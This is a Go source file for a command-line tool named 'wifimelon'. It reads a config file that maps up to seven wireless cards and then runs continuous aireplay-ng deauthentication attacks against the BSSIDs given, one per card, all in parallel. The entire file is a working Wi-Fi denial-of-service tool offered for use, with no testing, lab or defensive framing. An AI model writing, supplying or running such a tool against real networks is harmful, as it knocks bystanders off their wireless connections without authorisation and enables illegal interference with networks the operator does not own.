package main

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"sync"
)

// Config holds the mapping for attack and host interfaces.
type Config struct {
	Attack [7]string // attack[0] corresponds to attack1, etc.
	Host24 string     // currently unused
	Host5  string     // currently unused
}

// loadConfig reads a simple key=value config file and returns a Config struct.
func loadConfig(filename string) (*Config, error) {
	cfg := &Config{}

	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		// Skip blank lines and comments.
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		// Expect key=value format.
		parts := strings.SplitN(line, "=", 2)
		if len(parts) != 2 {
			continue
		}
		key := strings.TrimSpace(parts[0])
		value := strings.TrimSpace(parts[1])
		switch key {
		case "attack1":
			cfg.Attack[0] = value
		case "attack2":
			cfg.Attack[1] = value
		case "attack3":
			cfg.Attack[2] = value
		case "attack4":
			cfg.Attack[3] = value
		case "attack5":
			cfg.Attack[4] = value
		case "attack6":
			cfg.Attack[5] = value
		case "attack7":
			cfg.Attack[6] = value
		case "host2.4":
			cfg.Host24 = value
		case "host5":
			cfg.Host5 = value
		}
	}
	if err := scanner.Err(); err != nil {
		return nil, err
	}
	return cfg, nil
}

// deauthAttack runs aireplay-ng to perform a deauthentication attack
// on a given interface for a target BSSID.
func deauthAttack(iface, bssid string) {
	fmt.Printf("[Interface %s] Starting deauth attack on BSSID %s...\n", iface, bssid)
	cmd := exec.Command("aireplay-ng", "-0", "0", "-a", bssid, iface)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err := cmd.Run()
	if err != nil {
		fmt.Printf("[Interface %s] Error running aireplay-ng for %s: %v\n", iface, bssid, err)
	} else {
		fmt.Printf("[Interface %s] Deauth attack on %s terminated normally.\n", iface, bssid)
	}
}

// mdeauth takes up to 7 BSSID parameters and runs a deauth attack on each
// using the corresponding configured attack card. If an attack card is not configured,
// it prints a message and skips that target.
func mdeauth(bssids []string, cfg *Config) {
	// Limit to at most 7 BSSIDs.
	if len(bssids) > 7 {
		bssids = bssids[:7]
	}

	var wg sync.WaitGroup

	for i, bssid := range bssids {
		iface := cfg.Attack[i]
		if iface == "" {
			fmt.Printf("No attack interface configured for attack card %d, skipping BSSID %s.\n", i+1, bssid)
			continue
		}
		wg.Add(1)
		go func(iface, bssid string, index int) {
			defer wg.Done()
			deauthAttack(iface, bssid)
		}(iface, bssid, i)
	}

	wg.Wait()
}

// printUsage displays the command usage.
func printUsage() {
	fmt.Println("Usage:")
	fmt.Println("  wifimelon mdeauth <bssid1> [bssid2 ... bssid7]   Start multiple deauth attack")
}

func main() {
	// Ensure a command is provided.
	if len(os.Args) < 2 {
		printUsage()
		os.Exit(1)
	}

	// Load configuration from config.conf.
	cfg, err := loadConfig("config.conf")
	if err != nil {
		fmt.Printf("Error loading config.conf: %v\n", err)
		os.Exit(1)
	}

	// Determine which command to execute.
	cmdArg := os.Args[1]
	switch cmdArg {
	case "mdeauth":
		if len(os.Args) < 3 {
			fmt.Println("Error: mdeauth requires at least one BSSID parameter.")
			printUsage()
			os.Exit(1)
		}
		// The BSSID parameters start at os.Args[2].
		bssids := os.Args[2:]
		mdeauth(bssids, cfg)
	default:
		fmt.Printf("Unknown command: %s\n", cmdArg)
		printUsage()
		os.Exit(1)
	}
}
